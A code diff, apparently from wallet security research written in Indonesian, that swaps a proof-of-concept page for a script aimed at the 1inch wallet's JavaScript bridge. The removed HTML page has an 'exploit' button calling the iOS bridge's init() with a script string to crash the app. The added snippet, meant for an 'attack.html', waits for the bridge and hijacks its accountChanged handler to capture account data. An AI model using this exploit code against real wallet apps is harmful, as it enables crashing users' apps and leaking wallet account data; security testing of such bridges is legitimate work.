@@ -1,51 +1,14 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC 1inch Bridge Test</title>
-    <style>
-        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; text-align: center; }
-        .box { border: 1px solid #333; padding: 15px; border-radius: 8px; margin-top: 20px; }
-        button { background: #0f0; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; border-radius: 5px; }
-        button:active { background: #0a0; }
-        #status { margin-top: 15px; color: yellow; }
-    </style>
-</head>
-<body>
-
-    <h2>🛠️ 1inch Bridge PoC</h2>
-    <p>Target: OneInchiOSWallet.init()</p>
-
-    <div class="box">
-        <button onclick="triggerCrash()">JALANKAN EXPLOIT</button>
-        <div id="status">Status: Menunggu interaksi...</div>
-    </div>
-
-    <script>
-        function triggerCrash() {
-            const statusDiv = document.getElementById('status');
-            const target = window.OneInchiOSWallet;
-
-            if (!target) {
-                statusDiv.innerText = "Error: Bridge OneInchiOSWallet tidak ditemukan!";
-                statusDiv.style.color = "red";
-                return;
-            }
-
-            try {
-                statusDiv.innerText = "Mengirim payload... Jika aplikasi tertutup, PoC Berhasil.";
-                
-                // Perintah yang menyebabkan aplikasi keluar (crash)
-                // Berdasarkan temuan sebelumnya:
-                target.init("alert('Exploit Triggered')");
-
-            } catch (e) {
-                statusDiv.innerText = "Gagal: " + e.message;
-                statusDiv.style.color = "red";
-            }
-        }
-    </script>
-
-</body>
-</html>
+// Jalankan ini di attack.html kamu
+function waitAndWatch() {
+    const bridgeName = "OneInchSolanaWallet"; // Atau OneInchiOSWallet
+    if (window[bridgeName]) {
+        console.log("Bridge Siap!");
+        // Coba baca data akun secara pasif
+        window[bridgeName].accountChanged = function(data) {
+            alert("TEMUAN KRITIKAL: Data Akun Bocor! " + JSON.stringify(data));
+        };
+    } else {
+        setTimeout(waitAndWatch, 1000); // Tunggu sampai bridge muncul
+    }
+}
+waitAndWatch();
